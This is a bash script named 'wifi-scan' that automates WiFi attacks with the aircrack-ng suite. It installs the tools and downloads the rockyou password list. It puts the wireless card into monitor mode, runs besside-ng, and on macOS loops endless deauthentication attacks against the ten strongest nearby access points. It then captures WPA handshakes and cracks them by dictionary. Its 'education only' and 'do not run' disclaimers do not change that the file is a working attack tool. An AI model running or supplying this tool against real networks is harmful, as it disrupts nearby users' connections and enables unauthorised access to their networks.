#!/bin/bash

# This script is for education purposes only and should not be executed.
# Do NOT execute on public networks.

# Helpful Commands
# sudo lshw -C network # Get all details about the wifi interface

RED=$(tput setaf 1) #'\033[31m'
GREEN=$(tput setaf 2) #'\033[32m'
YELLOW=$(tput setaf 3) #'\033[33m'
BLUE=$(tput setaf 14) #'\033[34m'
GRAY=$(tput setaf 8) #'\033[90m'
RESET=$(tput sgr0) #'\033[0m'

ME=$(basename "${0}")
VERSION="v0.01"

INSTALL_FOLDER=~/apps
WORDLIST_FOLDER=~/apps/aircrack-ng/wordlists
CAPTURE_FOLDER=~/capture

ROCKYOU_URL="https://github.com/zacheller/rockyou/blob/master/rockyou.txt.tar.gz?raw=true"

AIRPORT_CMD="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

function _default() {
  cat <<HEREDOC
${GREEN}wifi-scan${RESET}
WiFi Scanner (${VERSION}). Use -h or --help param for help.
${GRAY}WARNING: DO NOT USE THIS PROGRAM! DO NOT RUN IT!${RESET}

${YELLOW}USAGE:${RESET}
    wifi-scan <SUBCOMMAND> <PARAMS>
    ${GRAY}wifi-scan run wlan0${RESET}
    ${GRAY}wifi-scan list${RESET}
    ${GRAY}wifi-scan crack "00:00:11:22:33:44"${RESET}

${YELLOW}SUBCOMMANDS:${RESET}
    ${GREEN}run       ${RESET}Run wide scan. Optional param inteface (e.g. wlan0). Stop with CTRL+C.
    ${GREEN}install   ${RESET}Clones and installs aircrack-ng suite. Linux only, needs internet.
    ${GREEN}update    ${RESET}Pull and re-build aircrack-ng installation.
    ${GREEN}available ${RESET}List available WiFis with channels.
    ${GREEN}download  ${RESET}Download and unzip rockyou.txt wordlist (50MB).
    ${GREEN}list      ${RESET}List all owned/discovered networks (get BSSID here).
    ${GREEN}crack     ${RESET}Crack passphrase after scan. Required param BSSID (e.g. "00:00:11:22:33:44")

HEREDOC

  if [[ "$(uname)" == "Linux" ]]; then
    _validate "airmon-ng besside-ng"
  fi
  if [[ "$(uname)" == "Darwin" ]]; then
    _validate "aircrack-ng wpaclean"
  fi
}

function _install() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}install${RESET}"

  # Mac OS X only.
  if [[ "$(uname)" == "Darwin" ]]; then
    _validate brew
    mkdir -p /usr/local/bin
    sudo ln -s "${AIRPORT_CMD}" /usr/local/bin/airport
    sudo brew install aircrack-ng curl
    if [ $? -eq 0 ]; then
      echo -e "[${GREEN}DONE${RESET}] Installation successful"
      exit 0
    fi
    exit 1
  fi

  # MacOS install on M1/M2 CPUs.
  # brew install autoconf automake libtool openssl shtool pkg-config hwloc pcre2 sqlite3 libpcap cmocka
  # autoreconf -vif
  # env CPPFLAGS="-Wno-deprecated-declarations" ./configure --with-experimental
  # make
  # make check
  # sudo make install

  # Linux only.
  sudo apt-get install build-essential autoconf automake \
      libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev \
      ethtool shtool rfkill zlib1g-dev libpcap-dev libsqlite3-dev \
      libpcre2-dev libhwloc-dev libcmocka-dev hostapd wpasupplicant \
      tcpdump screen iw usbutils expect
  mkdir -p $INSTALL_FOLDER
  cd $INSTALL_FOLDER
  git clone http://github.com/aircrack-ng/aircrack-ng
  cd aircrack-ng
  autoreconf -i
  ./configure
  make
  make install
  if [ $? -eq 0 ]; then
    echo -e "[${GREEN}DONE${RESET}] Installation successful"
  fi
}

function _update() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}update${RESET}"
  # Mac OS X only.
  if [[ "$(uname)" == "Darwin" ]]; then
    echo -e ""
    echo -e "[${RED}Not Supported${RESET}] Update is not supported on MacOS."
  fi

  cd $INSTALL_FOLDER/aircrack-ng
  git pull
  autoreconf -i
  ./configure
  make
  if [ $? -eq 0 ]; then
    echo -e "[${GREEN}DONE${RESET}] Update successful"
  fi
}

function _validate() {
  REQUIRED=${@:-"airmon-ng besside-ng"}
  MISSING=""
  for i in $REQUIRED ; do
    command -v $i >/dev/null && continue || { MISSING="$MISSING $i"; }
  done
  if [ "$MISSING" ]; then
    echo -e "${RED}MISSING DEPENDENCY:${RESET}"
    for m in $MISSING ; do
      echo -e "    ${RED}$m${RESET} not found"
    done
    echo -e ""
    echo -e "    Please run \"${ME} install\""
    echo -e ""
    exit 1
  fi
}

function _download() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}download${RESET}"
  echo -e ""
  _validate curl
  echo -e "[${BLUE}START${RESET}] Downloading rockyou.txt"

  mkdir -p $WORDLIST_FOLDER
  local result=0
  if command -v curl >/dev/null ]; then
    curl $ROCKYOU_URL -L -o $WORDLIST_FOLDER/rockyou.txt.tar.gz
    result=$?
  else
    wget $ROCKYOU_URL -O $WORDLIST_FOLDER/rockyou.txt.tar.gz
    result=$?
  fi
  if [ $result -eq 0 ]; then
    echo -e "[${GREEN}DONE${RESET}] Download of rockyou.txt.tar.gz successful"
  else
    echo -e "[${RED}ERROR${RESET}] Download of rockyou.txt.tar.gz failed"
    exit 1
  fi
  tar xvzf $WORDLIST_FOLDER/rockyou.txt.tar.gz -C $WORDLIST_FOLDER
  echo -e "[${GREEN}DONE${RESET}] Unzip of rockyou.txt.tar.gz successful"
}

function _runMac() {
  echo -e "[${BLUE}START${RESET}] Initiating the scan with wifi-scan (MacOS version). Cancel with Command+C."
  echo -e ""

  #_validate "aircrack-ng wpaclean"

  # Create and always use ture dir.
  mkdir -p $CAPTURE_FOLDER
  cd $CAPTURE_FOLDER

  #sudo "${AIRPORT_CMD}" -zs
  # TODO: Move to variable
  wifis=$(sudo ${AIRPORT_CMD} -zs | tee /dev/tty)
  echo -e ""
  #echo $wifis

  iface="en0"

  # Start sniffing on channel (puts wifi in monitor mode).
    # This will run until interrupted with Ctrl+C
  # The parentheses make it execute in a subshell, so the "exit" just exits that.
  (
    # Run following after Ctrl+C interrupt.
    trap "finished" SIGINT SIGTERM
    function finished() {
      echo -e "[${GREEN}DONE${RESET}] Scan interrupted / ended. "
      local pids=$(ps aux | grep '[a]irport ' | awk '{print $2}')
      if [ -n "$pids" ]; then
        echo -e "Killing leftover processes: $pids"
        sudo kill -s INT $pids
      fi
      exit
    }
    # Get list of channels with wifis.
    #echo "WIFIS IN:\n$wifis"
    channels=$(printf '%s' "$wifis" | awk -F ' ' '{print $4}' | sort | uniq)
    #echo "CHANNELS IN:\n$channels"
    # For each channel start sniffing.
    echo -e "[${BLUE}START${RESET}] Starting sniffing on all channels with active wifis."
    for i in $channels; do
      if [[ $i =~ ^[0-9]+$ ]]; then
          printf "%s[CH: %03d]%s Sniffing on channel %s: " ${GRAY} $i ${RESET} $i
          sudo "${AIRPORT_CMD}" $iface sniff $i &
          sleep 1
      fi
    done

    # Get list of last 10 bssids (the ones with the highest signal)
    echo -e "[${BLUE}START${RESET}] Run deauth on the BSSIDs with the highest signal"
    bssids=$(printf '%s' "$wifis" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | tail -10)
    #bssids=$(printf '%s' "$wifis" | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | sort | uniq)
    #echo "BSSIDS IN:\n$bssids"
    # While sniffing still happening try doing deauth.
    while true; do
      for bssid in $bssids; do
        printf "%s[BSSID: %s]%s Running deauth: " ${GRAY} $bssid ${RESET}
        sudo aireplay-ng --deauth 0 -a $bssid $iface
        sleep 1
      done
      sleep 1
    done
  )

  # if does not exist create besside.log
  if [[ ! -e "$CAPTURE_FOLDER/besside.log" ]]; then
    touch "$CAPTURE_FOLDER/besside.log"
    echo "Captured WPA handshake packets for following networks:" > "$CAPTURE_FOLDER/besside.log"
  fi

  # Run WPAClean to combine all the result into single nice capture. wpaclean is part of aircrack-ng.
  echo -e "[${BLUE}START${RESET}] Extract useful stuff from the caps into $CAPTURE_FOLDER/wpa.cap"
  wpaclean "$CAPTURE_FOLDER/wpa.cap" /tmp/airportSniff*.cap | tee >(grep "Net" >> $CAPTURE_FOLDER/besside.log)
  # TODO: if it succeeds, then following should run, wpa.cap may not always be there.
  if [[ -e "$CAPTURE_FOLDER/wpa.cap" ]]; then
    echo -e "[${GREEN}DONE${RESET}] Filtered output is in $CAPTURE_FOLDER/wpa.cap"
    sudo rm /tmp/airportSniff*
    echo -e "[${GREEN}DONE${RESET}] Removed all /tmp/airportSniff*"
    echo -e "Don't upload the results to https://wpa-sec.stanev.org for automated cracking."
  else
    echo -e "[${RED}ERROR${RESET}] No WPA handshakes were captured or wpaclean returned error"
    exit 1
  fi
  exit 0
}

function _run() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}run${RESET}"
  echo -e "WiFi Scan (v.01)."
  echo -e ""

  # Mac OS X only.
  if [[ "$(uname)" == "Darwin" ]]; then
    _runMac
    exit 0
  fi

  _validate

  echo -e "[${BLUE}START${RESET}] Initiating the scan with wifi-scan"

  # Create and always use capture dir.
  mkdir -p $CAPTURE_FOLDER
  cd $CAPTURE_FOLDER

  # Set the wifi wlan as variable.
  export TARGET_WLAN=${2:-'wlp0s20f3'}

  # Clean up apps that may cause trouble.
  sudo airmon-ng check kill

  # Put your network device into monitor mode.
  sudo airmon-ng start $TARGET_WLAN
  echo -e "[${GREEN}DONE${RESET}] Switched WiFi device to monitor mode"

  # Start the scan. From here it goes automatically.
  echo -e "[${BLUE}START${RESET}] Starting scan"
  sudo besside-ng $TARGET_WLAN"mon"
  # Custom Wifi: sudo besside-ng -R "wifiABC" $TARGET_WLAN"mon"

  echo -e "[${GREEN}DONE${RESET}] Scan finished. Recovering WiFi."

  # Return wifi to managed state.
  sudo airmon-ng stop $TARGET_WLAN"mon"
  sudo /etc/init.d/network-manager start
  sudo systemctl start NetworkManager

  echo -e "[${GREEN}DONE${RESET}] Recovered original WiFi"
  echo -e "Don't upload the results to https://wpa-sec.stanev.org for automated cracking"
}

function _list() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}list${RESET}"
  echo -e ""
  cat $CAPTURE_FOLDER/besside.log
}

function _available() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}available${RESET}"
  echo -e ""
  echo -e "[${BLUE}START${RESET}] Scanning for available WiFis"
  # Mac OS X only.
  if [[ "$(uname)" == "Darwin" ]]; then
    # Getting BSSID requires sudo.
    sudo ${AIRPORT_CMD} -s
  fi

  # Linux only.
  if [[ "$(uname)" == "Linux" ]]; then
    nmcli dev wifi list
  fi
}

function _crack() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}crack${RESET}"
  echo -e ""
  _validate "aircrack-ng"

  wordlist=$WORDLIST_FOLDER/${3:-'rockyou.txt'}
  bssid=$2 # e.g. "00:11:22:33:44:55"
  # Appending "| tee" on the end to make it possible to stop with Ctrl+C
  aircrack-ng -w "$wordlist" -b "$bssid" $CAPTURE_FOLDER/wpa.cap | tee
  # Uncomment to crack WEP (you need to catch enough IVs for that)
  # aircrack-ng -b "$bssid" $CAPTURE_FOLDER/wep.cap | tee
  echo -e "[${GREEN}DONE${RESET}] Done"
}

case $1 in
  --help|-h)  _default    ; exit 0 ;;
  install)    _install    ; exit 0 ;;
  run)        _run $@     ; exit 0 ;;
  update)     _update $@  ; exit 0 ;;
  available)  _available  ; exit 0 ;;
  download)   _download   ; exit 0 ;;
  list)       _list       ; exit 0 ;;
  crack)      _crack $@   ; exit 0 ;;
  *)          _default    ; exit 0 ;;
esac
